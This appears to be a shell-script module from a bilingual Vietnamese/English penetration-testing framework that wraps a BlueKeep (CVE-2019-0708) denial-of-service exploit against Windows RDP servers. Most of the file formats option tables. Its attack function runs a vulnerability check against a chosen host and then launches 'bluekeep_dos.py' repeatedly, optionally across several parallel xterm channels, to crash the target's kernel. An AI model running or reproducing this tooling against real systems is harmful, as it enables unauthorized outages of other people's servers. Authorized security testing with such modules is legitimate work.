function module_info {
if [ "$language" = "VN" ]; then
cat << !

        Tên: CVE-2019-0708 | Lỗ hổng từ chối dịch vụ RDP
     Mô-đun: exploit/windows/rdp/CVE-2019-0708_rdp_dos
   Nền tảng: Windows
    Loại mã: Python
    Công bố: 14/05/2019

Cung cấp bởi:
   Ekultek
!
platform
cat << !

Mục tiêu khả dụng:
   Bao gồm các phiên bản Windows 64 bit và 32 bit của :
       Windows 2003
       Windows XP
       Windows Vista
       Windows Server 2008
       Windows Server 2008 R2
       Windows 7
!
module_compare
cat << !
Hỗ trợ quét lỗ hổng:
   Có

Miêu tả:
    BlueKeep (CVE-2019-0708) là một lỗ hổng trong giao thức điều khiển máy tính từ xa (RDP).
    Trình điều khiển RDP TermDD.sys xử lý không đúng các liên kết với kênh MS_T120,
    dẫn đến hàm MCSPort gọi đến hàm HandDisconnectProviderInication và MCSChannelClose
    đóng kênh MS_T120 trước khi trước khi hệ thống cố gắng đóng kênh MS_T120, đẫn đến việc
    nhân hệ thống bị sụp đổ gây ra màn hình xanh chết chóc.

Tham khảo:
    https://www.malwaretech.com/2019/05/analysis-of-cve-2019-0708-bluekeep.html
    https://www.exploit-db.com/exploits/47360
    https://www.exploit-db.com/exploits/47120
    https://github.com/Ekultek/BlueKeep

Còn được biết là:
   BlueKeep

!
elif [ "$language" = "EN" ]; then
cat << !

       Name: CVE-2019-0708 | Denial Of Service RDP
     Module: exploit/windows/rdp/CVE-2019-0708_rdp_dos
   Platform: Windows
  Code type: Python
  Disclosed: 14/05/2019

Provided by:
   Ekultek
!
platform
cat << !

Available targets:
   Includes 64-bit and 32-bit versions of Windows:
       Windows 2003
       Windows XP
       Windows Vista
       Windows Server 2008
       Windows Server 2008 R2
       Windows 7
!
module_compare
cat << !
Vulnerability scanning support:
   Yes

Description:
    BlueKeep (CVE-2019-0708) is a vulnerability in the Remote Desktop Protocol (RDP).
    The RDP TermDD.sys driver improperly handles binds to channel MS_T120, leads to 
    the MCSPort function calling the HandDisconnectProviderInication function and 
    MCSChannelClose function to close the MS_T120 channel before the system tried to close
    the MS_T120 channel,resulting in crash the kernel system causing the Blue Screen of Death.

References:
    https://www.malwaretech.com/2019/05/analysis-of-cve-2019-0708-bluekeep.html
    https://www.exploit-db.com/exploits/47360
    https://www.exploit-db.com/exploits/47120
    https://github.com/Ekultek/BlueKeep

Also known as:
  BlueKeep

!
fi

}
############ Hàm gán giá trị các biến #####################
function defaul_module_options {
	platform="Python"
	rhost=""
	rport="3389"
	num_channel="1"
	num_dos="1"
	target="0"
	verbose="False"
	rhost_lenght=18
}
############# Hàm kiểm tra chọn lựa để in ra màng hình ###############
function module_compare {
i_characters="i"
g_characters="g"	
_characters1="-"
_characters2="-"
if [[ $rhost_lenght -le 18 ]]; then
	rhost_lenght=18
fi
if  [[ "$rhost_lenght" -le 18 ]]; then
		module1
else
		module2
fi
}
############### Hàm nhận giá trị nhận vào của biến ###################
function set_module {
		if [[ "$new_processing_variables" = "platform" ]] || [[ "$new_processing_variables" = "PLATFORM" ]] || [[ "$new_processing_variables" = "Platform" ]]; then
			if [[ "$module_set" = "python" ]] || [[ "$module_set" = "PYTHON" ]] || [[ "$module_set" = "Python" ]] || [[ "$module_set" = "py" ]] || [[ "$module_set" = "Py" ]] || [[ "$module_set" = "0" ]]; then
				unset platform
				platform="$module_set"
			else 	failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
				echo -e "$red[-]$RESET" $failed_to_validate
			fi
		elif [[ "$new_processing_variables" = "rhost" ]] || [[ "$new_processing_variables" = "RHOST" ]] || [[ "$new_processing_variables" = "Rhost" ]]; then
			unset rhost
			rhost="$module_set"
			rhost_lenght=`echo $rhost | awk '{print length}'`
			if [[ $rhost_lenght -le 18 ]]; then
				rhost_lenght=18
			fi
		elif [[ "$new_processing_variables" = "rport" ]] || [[ "$new_processing_variables" = "RPORT" ]] || [[ "$new_processing_variables" = "Rport" ]]; then
			unset rport
			rport="$module_set"
		elif [[ "$new_processing_variables" = "num_channel" ]] || [[ "$new_processing_variables" = "NUM_CHANNEL" ]] || [[ "$new_processing_variables" = "Num_channel" ]]; then
			unset num_channel
			num_channel="$module_set"
		elif [[ "$new_processing_variables" = "num_dos" ]] || [[ "$new_processing_variables" = "NUM_DOS" ]] || [[ "$new_processing_variables" = "Num_dos" ]]; then
			unset num_dos
			num_dos="$module_set"
		elif [[ "$new_processing_variables" = "target" ]] || [[ "$new_processing_variables" = "TARGET" ]] || [[ "$new_processing_variables" = "Target" ]]; then
			if [[ "$module_set" = "0" ]]; then
				unset target
				target="$module_set"
			elif [[ "$module_set" = "1" ]]; then
				unset target
				target="$module_set"
			else 	failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
				echo -e "$red[-]$RESET" $failed_to_validate
			fi
		elif [[ "$new_processing_variables" = "verbose" ]] || [[ "$new_processing_variables" = "VERBOSE" ]] || [[ "$new_processing_variables" = "Verbose" ]]; then
			if [[ "$module_set" = "true" ]] || [[ "$module_set" = "TRUE" ]] || [[ "$module_set" = "True" ]]; then
				unset verbose
				verbose="$module_set"
			elif [[ "$module_set" = "false" ]] || [[ "$module_set" = "FALSE" ]] || [[ "$module_set" = "False" ]]; then
				unset verbose
				verbose="$module_set"
			else 	failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
				echo -e "$red[-]$RESET" $failed_to_validate
			fi
		fi
}
##################### Hàm canh lề cho biến ###################
############# Khi các biến có độ dài nhỏ hơn 18 ###############
function module1 {
none=" "
myvar=""
	function unset_value {
		unset none
		unset myvar
		unset integer
		none=" "
		myvar=""
	}
rhost=`echo $rhost`
rhost_lenght=`echo $rhost | awk '{print length}'`
	integer=`expr 20 - $rhost_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	rhost=$rhost$myvar
unset_value
rport=`echo $rport`
rport_lenght=`echo $rport | awk '{print length}'`
	integer=`expr 20 - $rport_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	rport=$rport$myvar
unset_value
num_channel=`echo $num_channel`
num_channel_lenght=`echo $num_channel | awk '{print length}'`
	integer=`expr 20 - $num_channel_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	num_channel=$num_channel$myvar
unset_value
num_dos=`echo $num_dos`
num_dos_lenght=`echo $num_dos | awk '{print length}'`
	integer=`expr 20 - $num_dos_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	num_dos=$num_dos$myvar
unset_value
verbose=`echo $verbose`
verbose_lenght=`echo $verbose | awk '{print length}'`
	integer=`expr 20 - $verbose_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	verbose=$verbose$myvar
unset_value
module_banner_1
}
function module2 {
none=" "
myvar=""
	function unset_value {
		unset none
		unset myvar
		unset subtract_compare_value
		none=" "
		myvar=""
	}
rhost=`echo $rhost`
rhost_lenght=`echo $rhost | awk '{print length}'`
greater_value=$rhost_lenght
rport=`echo $rport`
rport_lenght=`echo $rport | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $rport_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	rport=$rport$myvar
unset_value
num_channel=`echo $num_channel`
num_channel_lenght=`echo $num_channel | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $num_channel_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	num_channel=$num_channel$myvar
unset_value
num_dos=`echo $num_dos`
num_dos_lenght=`echo $num_dos | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $num_dos_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	num_dos=$num_dos$myvar
unset_value
verbose=`echo $verbose`
verbose_lenght=`echo $verbose | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $verbose_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	verbose=$verbose$myvar
unset_value
subtract_compare_value=`expr $greater_value - 17 + 4`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	i_characters=$i_characters$myvar
unset_value
subtract_compare_value=`expr $greater_value - 17 + 4`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	g_characters=$g_characters$myvar
unset_value
subtract_compare_value=`expr $greater_value - 16 + 5`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	_characters1=$_characters1$myvar
unset_value
subtract_compare_value=`expr $greater_value - 16 + 3`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	_characters2=$_characters2$myvar
unset_value

module_banner_2
}
function module_banner_1 {
if [ "$language" = "VN" ]; then
yes="  Có"
no="  Không"
cat << !

Các tùy chọn của mô-đun (exploit/windows/rdp/CVE-2019-0708_rdp_dos):

   Tên       	  Thiết lập hiện tại 	Yêu cầu   Miêu tả
   ----           --------------- 	--------  -----------
   RHOST          $rhost $yes       Địa chỉ hoặc tên miền của máy chủ mục tiêu.
   RPORT          $rport $no	  Cổng dịch vụ máy chủ RDP đang chạy.
   NUM_DOS        $num_dos $no	  Số lần thực hiện tấn công trên máy chủ mục tiêu.
   NUM_CHANNEL    $num_channel $no	  Số kênh thực hiện tấn công trên máy chủ mục tiêu.
   VERBOSE        $verbose $no	  Xem chi tiết.

!
elif [ "$language" = "EN" ]; then
yes="  yes"
no="  no "
cat << !

Module options (exploit/windows/rdp/CVE-2019-0708_rdp_dos):

   Name           Current Setting 	Required  Description
   ----           --------------- 	--------  -----------
   RHOST          $rhost $yes      Address or domain name of target server.
   RPORT          $rport $no	  The RDP server service port is running.
   NUM_DOS        $num_dos $no	  Number of attacks performed on the target server.
   NUM_CHANNEL    $num_channel $no	  Number of channels performing attacks on the target server.
   VERBOSE        $verbose $no	  See details.

!
fi	
}
function module_banner_2 {
if [ "$language" = "VN" ]; then
yes="  Có"
no="  Không"
cat << !

Các tùy chọn của mô-đun (exploit/windows/rdp/CVE-2019-0708_rdp_dos):

   Tên       	  Thiết lập hiện tạ${i_characters}Yêu cầu   Miêu tả
   ----       	  ---------------${_characters1}--------  -----------
   RHOST          $rhost $yes       Địa chỉ hoặc tên miền của máy chủ mục tiêu
   RPORT          $rport $no    Cổng dịch vụ máy chủ RDP đang chạy.
   NUM_DOS        $num_dos $no	  Số lần thực hiện tấn công trên máy chủ mục tiêu.
   NUM_CHANNEL    $num_channel $no	  Số kênh thực hiện tấn công trên máy chủ mục tiêu.
   VERBOSE        $verbose $no	  Xem chi tiết.

!
elif [ "$language" = "EN" ]; then
yes="  yes"
no="  no "
cat << !

Module options (exploit/windows/rdp/CVE-2019-0708_rdp_dos):

   Name           Current Setting${g_characters}Required  Description
   ----           ---------------${_characters2}--------  -----------
   RHOST          $rhost $yes      Address or domain name of target server.
   RPORT          $rport $no	  The RDP server service port is running.
   NUM_DOS        $num_dos $no	  Number of attacks performed on the target server.
   NUM_CHANNEL    $num_channel $no	  Number of channels performing attacks on the target server.
   VERBOSE        $verbose $no	  See details.

!
fi
		
}
function show_platforms {
if [ "$language" = "VN" ]; then
echo -e """
Nền tảng mã khai thác:

   Id  Tên
   --  ----
   0   ${BlueF}Py${yellow}thon${RESET}
"""
elif [ "$language" = "EN" ]; then
echo -e """
Exploit code platform:

   Id  Name
   --  ----
   0   ${BlueF}Py${yellow}thon${RESET}
"""
fi
}
function platform {
if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then
	if [ "$language" = "VN" ]; then
echo -ne """
Nền tảng được chọn:

   Id  Tên
   --  ----
   0   ${BlueF}Py${yellow}thon${RESET}
"""
	elif [ "$language" = "EN" ]; then
echo -ne """
Platform selected:

   Id  Name
   --  ----
   0   ${BlueF}Py${yellow}thon${RESET}
"""
	fi
fi
}
################# targets ###################
#############################################
function show_targets {
if [ "$language" = "VN" ]; then
cat << !

Các mục tiêu có thể khai thác:

   Id  Tên
   --  ----
   0   Windows 2003, XP, Vista, 7, Server 2008, Server 2008 R2 kiến trúc 64 bit
   1   Windows 2003, XP, Vista, 7, Server 2008, Server 2008 R2 kiến trúc 32 bit

!
elif [ "$language" = "EN" ]; then
cat << !

Exploit target:

   Id  Name
   --  ----
   0   Windows 2003, XP, Vista, 7, Server 2008, Server 2008 R2 architecture 64 bit
   1   Windows 2003, XP, Vista, 7, Server 2008, Server 2008 R2 architecture 32 bit

!
fi
}

function target {
if [ "$language" = "VN" ]; then
	if [ "$target" = "0" ]; then 
cat << !
Các mục tiêu có thể khai thác:

   Id  Tên
   --  ----
   0   Windows 2003, XP, Vista, 7, Server 2008, Server 2008 R2 kiến trúc 64 bit

!
else
cat << !
Các mục tiêu có thể khai thác:

   Id  Tên
   --  ----
   1   Windows 2003, XP, Vista, 7, Server 2008, Server 2008 R2 kiến trúc 32 bit

!
fi
elif [ "$language" = "EN" ]; then
	if [ "$target" = "0" ]; then 
cat << !
Exploit target:

   Id  Name
   --  ----
   0   Windows 2003, XP, Vista, 7, Server 2008, Server 2008 R2 architecture 64 bit

!
	else
cat << !
Exploit target:

   Id  Name
   --  ----
   1   Windows 2003, XP, Vista, 7, Server 2008, Server 2008 R2 architecture 32 bit

!
	fi
fi
}
################# payload list ###################
#############################################
function payload_list {
echo -n ""
}
function out_value {
rhost=`echo $rhost`
rport=`echo $rport`
num_channel=`echo $num_channel`
num_dos=`echo $num_dos`
verbose=`echo $verbose`
file_ip="ip.txt"
timeout="3"
target=`echo $target`
if [[ "$target" = "0" ]]; then
	arch="64"
else
	arch="32"
fi
}
function check {
rhost=`echo $rhost`
rport=`echo $rport`
path_present=`pwd`
path_tool="../../Tools/Vulnerability-Exploit/CVE-2019-0708/"
file_ip="ip.txt"
timeout="3"
cd $path_tool
rm -rf $file_ip > /dev/null 2>&1
touch $file_ip > /dev/null 2>&1
echo "$rhost" >>  $file_ip
bash checkvuln.sh -p $rport -t $timeout
cd $path_present
}
function module_run {
echo -n ""
}
function attack {
#####################
path_present=`pwd`
cd $path_present/../../output
output_file=`pwd`
###################
path_tool="$output_file/../Tools/Vulnerability-Exploit/CVE-2019-0708/"
cd $path_tool
file_ip="ip.txt"
rm -rf $file_ip > /dev/null 2>&1
touch $file_ip > /dev/null 2>&1
echo "$rhost" >>  $file_ip
check_host=`bash checkvuln.sh -p $rport -t $timeout | grep CVE-2019-0708`
if [[ "$check_host" != "" ]]; then
	if [[ "$num_channel" = "1" ]]; then
		if [[ "$verbose" = "true" ]] || [[ "$verbose" = "TRUE" ]] || [[ "$verbose" = "True" ]]; then
			python bluekeep_dos.py -i $rhost -p $rport --arch $arch --dos-times $num_dos -v
		else
			python bluekeep_dos.py -i $rhost -p $rport --arch $arch --dos-times $num_dos
		fi
	else
		if [[ "$verbose" = "true" ]] || [[ "$verbose" = "TRUE" ]] || [[ "$verbose" = "True" ]]; then
			for (( i = 1 ; i <= $num_channel; i++ )) do
				xterm -title "Channel $i" -e python bluekeep_dos.py -i $rhost -p $rport --arch $arch --dos-times $num_dos -v &
			done
		else
			for (( i = 1 ; i <= $num_channel; i++ )) do
				xterm -title "Channel $i" -e python bluekeep_dos.py -i $rhost -p $rport --arch $arch --dos-times $num_dos &
			done
		fi
	fi
else
	echo -e "${red}[-]$RESET $yout_sure"
fi
cd $path_present
}
